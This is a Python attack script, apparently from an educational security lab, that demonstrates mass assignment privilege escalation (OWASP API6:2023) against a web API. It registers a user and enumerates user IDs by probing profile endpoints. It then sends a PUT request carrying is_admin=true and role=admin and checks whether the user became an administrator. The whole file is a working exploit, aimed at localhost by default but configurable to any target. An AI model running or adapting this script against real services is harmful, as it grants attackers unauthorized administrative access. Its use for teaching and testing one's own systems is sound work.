"""
Mass Assignment Attack Script
==============================
Registers a fresh user, captures before-state, sends PUT with is_admin=true,
then re-fetches to confirm privilege escalation. Demonstrates OWASP API6:2023.

Usage:
    TARGET_URL=http://localhost:8000 python offensive/mass_assignment.py
"""
import asyncio
import os

import httpx
from rich.console import Console
from rich.panel import Panel

console = Console()
BASE_URL = os.getenv("TARGET_URL", "http://localhost:8000")

VICTIM_USER = {
    "username": "victim_attack",
    "email": "victim_attack@lab.local",
    "password": "VictimPass123!",
}

MASS_ASSIGN_PAYLOAD = {
    "username": VICTIM_USER["username"],
    "email": VICTIM_USER["email"],
    "is_admin": True,
    "role": "admin",
    "is_active": True,
}


async def run():
    console.print(Panel.fit(
        f"[bold red]Mass Assignment Attack[/]\nTarget: {BASE_URL}\n"
        "Attempts to escalate a regular user to admin via unprotected field binding.",
        title="[red]OFFENSIVE TOOL — EDUCATIONAL USE ONLY[/]"
    ))

    async with httpx.AsyncClient() as client:
        # Step 1: Register victim user
        console.print("\n[cyan][1] Registering victim user...[/]")
        reg = await client.post(
            f"{BASE_URL}/auth/register",
            json=VICTIM_USER,
        )
        if reg.status_code not in (200, 201):
            # Try login if already registered
            reg = await client.post(
                f"{BASE_URL}/auth/login",
                json={"username": VICTIM_USER["username"], "password": VICTIM_USER["password"]},
            )
        if reg.status_code != 200:
            console.print(f"[red]Could not register/login victim: {reg.text}[/]")
            return

        token = reg.json().get("access_token")
        headers = {"Authorization": f"Bearer {token}"}
        console.print(f"[green]   ✓ Obtained token: {token[:40]}...[/]")

        # Step 2: Get user ID
        me_resp = await client.get(f"{BASE_URL}/auth/login", headers=headers)
        # Enumerate to find our user ID
        uid: int | None = None
        for i in range(1, 50):
            r = await client.get(f"{BASE_URL}/api/users/{i}/profile", headers=headers)
            if r.status_code == 200 and r.json().get("username") == VICTIM_USER["username"]:
                uid = i
                break

        if uid is None:
            console.print("[red]Could not locate victim user ID — run seed_db first[/]")
            return

        console.print(f"[cyan][2] Victim user ID: {uid}[/]")

        # Step 3: Capture BEFORE state
        before_resp = await client.get(
            f"{BASE_URL}/api/users/{uid}/profile", headers=headers
        )
        before = before_resp.json() if before_resp.status_code == 200 else {}
        console.print(f"[cyan][3] BEFORE state:[/]  is_admin={before.get('is_admin')} | role={before.get('role', 'N/A')}")

        # Step 4: Mass assignment attack
        console.print(f"[red][4] Sending mass assignment payload with is_admin=true...[/]")
        attack_resp = await client.put(
            f"{BASE_URL}/api/users/{uid}",
            headers=headers,
            json=MASS_ASSIGN_PAYLOAD,
        )
        console.print(f"   PUT /api/users/{uid} → HTTP {attack_resp.status_code}")

        # Step 5: Capture AFTER state
        after_resp = await client.get(
            f"{BASE_URL}/api/users/{uid}/profile", headers=headers
        )
        after = after_resp.json() if after_resp.status_code == 200 else {}
        console.print(f"[cyan][5] AFTER state:[/]   is_admin={after.get('is_admin')} | role={after.get('role', 'N/A')}")

        # Result panel
        escalated = after.get("is_admin") is True
        console.print(Panel(
            f"[bold]BEFORE:[/]  is_admin = {before.get('is_admin', '?')}\n"
            f"[bold]ATTACK:[/]  HTTP {attack_resp.status_code} with payload is_admin=true\n"
            f"[bold]AFTER:[/]   is_admin = {after.get('is_admin', '?')}\n\n"
            f"{'[bold red]✗ ESCALATION SUCCESSFUL — VULNERABLE MODE[/]' if escalated else '[bold green]✓ ESCALATION BLOCKED — SECURED MODE[/]'}",
            title="Mass Assignment Result",
            border_style="red" if escalated else "green",
        ))

        if not escalated and attack_resp.status_code == 422:
            console.print("[green]422 Unprocessable Entity — Pydantic rejected unrecognised fields[/]")
        elif not escalated and attack_resp.status_code == 403:
            console.print("[green]403 Forbidden — Role check blocked the update[/]")


if __name__ == "__main__":
    asyncio.run(run())
